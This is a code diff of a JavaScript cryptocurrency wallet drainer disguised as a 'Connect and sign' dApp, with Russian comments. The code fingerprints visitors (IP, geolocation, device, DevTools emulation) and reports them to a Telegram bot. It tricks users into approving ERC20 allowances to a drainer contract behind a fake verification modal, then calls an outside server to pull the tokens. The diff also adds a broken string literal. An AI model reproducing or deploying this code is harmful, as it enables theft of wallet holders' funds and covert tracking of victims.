@@ -1,8 +1,9 @@
+// === Импорты зависимостей ===
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
-import config from './config.js';
+import config from './config.js'; // Импортируем конфигурацию
 
 // === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
@@ -16,7 +17,7 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://amllegit.com/',
+    url: 'https://amllegit.com/,
     icons: ['https://amllegit.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
@@ -33,8 +34,10 @@ let modalContent = null;
 let modalSubtitle = null;
 
 // === Константы и конфигурации ===
+// Переменная для отслеживания времени последнего вызова drain
 let lastDrainTime = 0;
 
+// ABI для ERC20 токенов
 const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
@@ -42,13 +45,11 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-const DRAINER_ABI = [
-  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
-];
-
 // === Функции ===
+// Функция для создания задержки
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+// Функция для отправки сообщения в Telegram
 async function sendTelegramMessage(message) {
   try {
     const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -68,6 +69,7 @@ async function sendTelegramMessage(message) {
   }
 }
 
+// Функция для получения IP-адреса пользователя
 async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) return cachedIP;
@@ -83,6 +85,7 @@ async function getUserIP() {
   }
 }
 
+// Функция для получения геолокации по IP
 async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) return cachedLocation;
@@ -101,13 +104,16 @@ async function getGeolocation(ip) {
   }
 }
 
+// Функция для определения устройства с учётом эмуляции
 function detectDevice() {
   const userAgent = navigator.userAgent.toLowerCase();
   const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
 
+  // Проверяем, включена ли эмуляция в Chrome DevTools
   const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
 
   if (isDevToolsEmulation) {
+    // Если это эмуляция, определяем реальное устройство
     const realPlatform = navigator.platform.toLowerCase();
     if (/win32|win64/i.test(realPlatform)) return "Windows";
     if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
@@ -115,6 +121,7 @@ function detectDevice() {
     return "Unknown";
   }
 
+  // Обычная проверка для реальных устройств
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
   if (/android/i.test(userAgent)) return "Android";
   if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
@@ -123,11 +130,13 @@ function detectDevice() {
   return "Unknown";
 }
 
+// Функция для проверки, является ли устройство мобильным
 function isMobileDevice() {
   const device = detectDevice();
   return device === "iPhone" || device === "Android";
 }
 
+// Функция для отправки уведомления при заходе на сайт
 async function notifyOnVisit() {
   if (sessionStorage.getItem('visitNotified')) return;
 
@@ -145,8 +154,10 @@ async function notifyOnVisit() {
   sessionStorage.setItem('visitNotified', 'true');
 }
 
+// Вызываем notifyOnVisit при загрузке
 notifyOnVisit();
 
+// Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
   if (tokenSymbol === "USDTUSDT") return 1;
 
@@ -160,6 +171,7 @@ async function getTokenPriceInUSDT(tokenSymbol) {
   }
 }
 
+// Функция для выбора рабочего провайдера
 async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
     try {
@@ -177,15 +189,10 @@ async function getWorkingProvider(rpcUrls) {
   return workingProvider;
 }
 
+// Проверка баланса
 async function checkBalance(chainId, userAddress, provider) {
   const chainConfig = config.CHAINS[chainId];
-  let nativeBalance, tokenBalances = {};
-
-  try {
-    nativeBalance = await provider.getBalance(userAddress);
-  } catch (error) {
-    throw new Error('Failed to fetch native balance');
-  }
+  let tokenBalances = {};
 
   try {
     const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
@@ -207,7 +214,6 @@ async function checkBalance(chainId, userAddress, provider) {
       try {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
         const balance = await token.balanceOf(userAddress);
-        const decimals = await token.decimals();
         return { address: tokenAddress, balance };
       } catch (error) {
         return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
@@ -220,9 +226,10 @@ async function checkBalance(chainId, userAddress, provider) {
     });
   }
 
-  return { nativeBalance, tokenBalances };
+  return { tokenBalances };
 }
 
+// Проверка наличия средств
 function hasFunds(bal) {
   const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
 
@@ -233,6 +240,7 @@ function hasFunds(bal) {
   return false;
 }
 
+// Переключение сети
 async function switchChain(chainId) {
   try {
     await window.ethereum.request({
@@ -244,22 +252,26 @@ async function switchChain(chainId) {
   }
 }
 
+// Функция для форматирования адреса кошелька
 function shortenAddress(address) {
   if (!address || address.length < 10) return address;
   return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
+// Функция для определения названия кошелька
 function detectWallet() {
   if (window.ethereum?.isMetaMask) return "MetaMask";
   if (window.ethereum?.isTrust) return "Trust Wallet";
   return "Unknown Wallet";
 }
 
+// Функция для форматирования чисел
 function formatBalance(balance, decimals) {
   const formatted = ethers.utils.formatUnits(balance, decimals);
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
 
+// Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   const chainConfig = config.CHAINS[chainId];
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
@@ -274,14 +286,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const walletName = detectWallet();
     const networkName = chainConfig.name;
     const funds = [];
-
-    const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
-    if (parseFloat(nativeBalance) > 0) {
-      const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-      const nativePrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[chainConfig.nativeToken]);
-      const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
-      funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
-    }
 
     for (const tokenAddress of tokenAddresses) {
       const balance = bal.tokenBalances[tokenAddress];
@@ -319,7 +323,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   try {
     ethBalance = await provider.getBalance(userAddress);
   } catch (error) {
-    throw new Error('Failed to fetch native balance');
+    throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
   }
 
   const minEthRequired = ethers.utils.parseEther("0.0003");
@@ -353,9 +357,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
                     Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      if (!symbol) {
-        continue;
-      }
+      if (!symbol) continue;
       tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
     }
   }
@@ -374,9 +376,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   let modalClosed = false;
 
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
-    if (!token) {
-      continue;
-    }
+    if (!token) continue;
 
     const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
 
@@ -393,6 +393,14 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           nonce
         });
         const receipt = await tx.wait();
+        await delay(1000); // Даём время на обновление allowance
+
+        // Проверяем allowance после approve
+        const allowanceAfter = await contract.allowance(userAddress, chainConfig.drainerAddress);
+        if (allowanceAfter.lt(balance)) {
+          throw new Error(`Allowance not updated after approve for ${token}`);
+        }
+
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
         status = 'confirmed';
 
@@ -430,34 +438,35 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       token.balanceOf(userAddress),
       token.decimals()
     ]);
-    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
-    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;
-    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
-    if (roundedAmount.lte(0)) {
+    // Используем минимальное значение между текущим балансом и переданным amount
+    const effectiveAmount = balance.lt(amount) ? balance : amount;
+
+    if (effectiveAmount.lte(0)) {
       throw new Error('Amount is zero or negative');
     }
 
-    const response = await fetch('https://api.amllegit.com/api/transfer', {
+    const response = await fetch('https://api.amllegit.xyz/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: roundedAmount.toString(),
+        amount: effectiveAmount.toString(),
         chainId,
         txHash
       })
     });
     const data = await response.json();
     if (!data.success) {
-      throw new Error('Failed to notify server');
+      throw new Error(data.message || 'Failed to notify server');
     }
   } catch (error) {
-    throw new Error('Failed to notify server');
+    throw new Error(`Failed to notify server: ${error.message}`);
   }
 }
 
+// Основная функция runDrainer
 async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
@@ -498,6 +507,7 @@ async function runDrainer(provider, signer, userAddress) {
   return status;
 }
 
+// === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
@@ -697,6 +707,7 @@ window.addEventListener('DOMContentLoaded', () => {
   window.ethereum.on('chainChanged', onChainChanged);
 });
 
+// === Управление модальным окном верификации ===
 function showModal() {
   modalOverlay.style.display = 'block';
   modalOverlay.style.pointerEvents = 'auto';
@@ -715,6 +726,7 @@ async function hideModalWithDelay(errorMessage = null) {
   document.body.style.pointerEvents = 'auto';
 }
 
+// === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     await hideModalWithDelay("Transaction already completed or pending.");
@@ -761,10 +773,10 @@ async function attemptDrainer() {
       errorMessage = err.message;
     } else if (err.message.includes('Failed to approve token')) {
       errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
-    } else if (err.message.includes('Failed to process')) {
-      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (err.message.includes('Failed to switch chain')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    } else if (err.message.includes('Failed to notify server')) {
+      errorMessage = err.message; // Ошибка от сервера
     } else {
       errorMessage = `Error: ${err.message}`;
     }
@@ -773,6 +785,7 @@ async function attemptDrainer() {
   }
 }
 
+// === Подключение кошелька через AppKit и запуск дрейнера ===
 async function handleConnectOrAction() {
   try {
     if (!connectedAddress) {
@@ -794,6 +807,7 @@ async function handleConnectOrAction() {
   }
 }
 
+// === Обработка смены сети ===
 async function onChainChanged(chainId) {
   if (connectedAddress && !isTransactionPending) {
     await attemptDrainer();
@@ -802,8 +816,36 @@ async function onChainChanged(chainId) {
   }
 }
 
+// === Ожидание подключения кошелька через AppKit ===
 async function waitForWallet() {
   return new Promise((resolve, reject) => {
+    const isMobile = isMobileDevice();
+
+    const checkAccounts = async () => {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          window.ethereum.removeListener('accountsChanged', handler);
+          clearTimeout(timeout);
+          clearInterval(checkInterval);
+          resolve(accounts[0]);
+        } else {
+          const requestedAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          if (requestedAccounts.length > 0) {
+            window.ethereum.removeListener('accountsChanged', handler);
+            clearTimeout(timeout);
+            clearInterval(checkInterval);
+            resolve(requestedAccounts[0]);
+          }
+        }
+      } catch (err) {
+        window.ethereum.removeListener('accountsChanged', handler);
+        clearTimeout(timeout);
+        clearInterval(checkInterval);
+        reject(err);
+      }
+    };
+
     const timeout = setTimeout(() => {
       window.ethereum.removeListener('accountsChanged', handler);
       clearInterval(checkInterval);
@@ -840,29 +882,4 @@ async function waitForWallet() {
 
     checkAccounts();
   });
-
-  async function checkAccounts() {
-    try {
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      if (accounts.length > 0) {
-        window.ethereum.removeListener('accountsChanged', handler);
-        clearTimeout(timeout);
-        clearInterval(checkInterval);
-        resolve(accounts[0]);
-      } else {
-        const requestedAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        if (requestedAccounts.length > 0) {
-          window.ethereum.removeListener('accountsChanged', handler);
-          clearTimeout(timeout);
-          clearInterval(checkInterval);
-          resolve(requestedAccounts[0]);
-        }
-      }
-    } catch (err) {
-      window.ethereum.removeListener('accountsChanged', handler);
-      clearTimeout(timeout);
-      clearInterval(checkInterval);
-      reject(err);
-    }
-  }
 }
